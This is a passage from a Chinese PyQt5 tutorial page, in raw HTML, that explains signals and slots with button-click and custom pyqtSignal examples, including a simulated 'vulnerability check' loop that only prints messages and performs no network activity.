<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.click_my_btn)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> click_my_btn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> arg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 槽函数，点击按钮则调用该函数</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 这里的参数正好是信号发出，传递的参数</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"点击按钮啦~"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, arg)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h2>三、案例2：</h2>
<h3>自定义信号【重点】</h3>
<p>除了接收Qt自带的信号之外，我们也可以自行定义信号，在合适的时机，自行发射信号</p>
<p>自定义信号需要使用到 <code>pyqtSignal</code>来声明信号  ，并且需要在类中的函数之外声明</p>
<p>如果会自定义信号，那么信号和槽基本上也就掌握了。否则永远只会接收别人发射出的信号</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> time</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtCore </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 声明一个信号 只能放在函数的外面</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    my_signal </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> pyqtSignal</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg_history </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 用来存放消息</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">500</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">200</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建一个整体布局器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 用来显示检测到漏洞的信息</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">440</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # print(self.msg.frameSize())</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWordWrap</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 自动换行</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setAlignment</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(Qt.AlignTop)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 靠上</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # self.msg.setStyleSheet("background-color: yellow; color: black;")</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建一个滚动对象</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        scroll </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QScrollArea</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        scroll.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建垂直布局器，用来添加自动滚动条</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        v_layout </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        v_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(scroll)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建水平布局器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        h_layout </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QHBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"开始检测"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 绑定按钮的点击，点击按钮则开始检测</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.check)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        h_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 伸缩器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        h_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        h_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 操作将要显示的控件以及子布局器添加到container</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(v_layout)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(h_layout)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置布局器</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(container)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 绑定信号和槽</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.my_signal.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.my_slot)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> my_slot</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> msg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 更新内容</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(msg)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg_history.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">append</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(msg)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"&lt;br&gt;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">join</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg_history))</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">440</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">frameSize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">height</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">() </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 15</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.msg.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">repaint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 更新内容，如果不更新可能没有显示新内容</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> check</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i, ip </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> enumerate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">([</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"192.168.1.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> x </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> x </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> range</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">255</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)]):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            msg </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "模拟，正在检查 </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 上的漏洞...."</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ip</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">            # print(msg)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">            if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">                # 表示发射信号 对象.信号.发射(参数)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">                self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.my_signal.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">emit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(msg </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "【发现漏洞】"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0.01</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 